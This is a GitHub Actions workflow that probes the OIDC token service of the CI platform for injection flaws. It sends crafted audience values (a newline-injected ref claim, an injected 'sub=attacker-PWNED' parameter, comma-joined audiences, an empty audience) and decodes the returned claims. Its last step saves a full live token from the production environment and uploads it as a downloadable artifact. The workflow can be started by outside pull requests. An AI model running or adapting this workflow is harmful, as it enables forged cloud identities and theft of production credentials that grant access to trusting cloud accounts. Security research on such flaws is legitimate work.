name: OIDC Audience Injection Tests
on:
  workflow_dispatch:
  pull_request_target:
    types: [opened, synchronize, reopened]
permissions:
  contents: read
  id-token: write
jobs:
  oidc-audience-tests:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Test 1 - Standard audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Test 1: Standard audience ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
c=json.loads(base64.urlsafe_b64decode(p))
print('aud:', repr(c.get('aud')))
print('sub:', c.get('sub'))
print('event:', c.get('event_name'))"

      - name: Test 2 - Newline injection in audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%0aref%3Arefs%2Fheads%2Fmain" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Test 2: Newline injection ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
  print('sub:', c.get('sub'))
except Exception as e:
  print('Error decoding:', e)" 2>/dev/null || echo "Test 2: rejected/failed"

      - name: Test 3 - Sub parameter injection
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com&sub=attacker-PWNED" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Test 3: Sub injection ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
  print('sub:', repr(c.get('sub')))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "Test 3: rejected/failed"

      - name: Test 4 - Comma-separated audiences
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=sts.amazonaws.com%2Chttps%3A%2F%2Faccounts.google.com" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Test 4: Comma audience ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "Test 4: rejected/failed"

      - name: Test 5 - Empty audience
        run: |
          T=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=" | jq -r .value)
          PAYLOAD=$(echo "$T" | cut -d. -f2)
          echo "=== Test 5: Empty audience ==="
          echo "$PAYLOAD" | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
try:
  c=json.loads(base64.urlsafe_b64decode(p))
  print('aud:', repr(c.get('aud')))
  print('sub:', c.get('sub'))
except Exception as e:
  print('Error:', e)" 2>/dev/null || echo "Test 5: rejected/failed"

      - name: Capture full token for download
        run: |
          FULL=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "$FULL" > /tmp/full_token.txt
          echo "$FULL" | cut -d. -f2 | python3 -c "
import sys,base64,json
d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4)
print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))" > /tmp/token_payload.json
          cat /tmp/token_payload.json

      - uses: actions/upload-artifact@v4
        with:
          name: oidc-audience-test-results
          path: |
            /tmp/full_token.txt
            /tmp/token_payload.json
          retention-days: 1
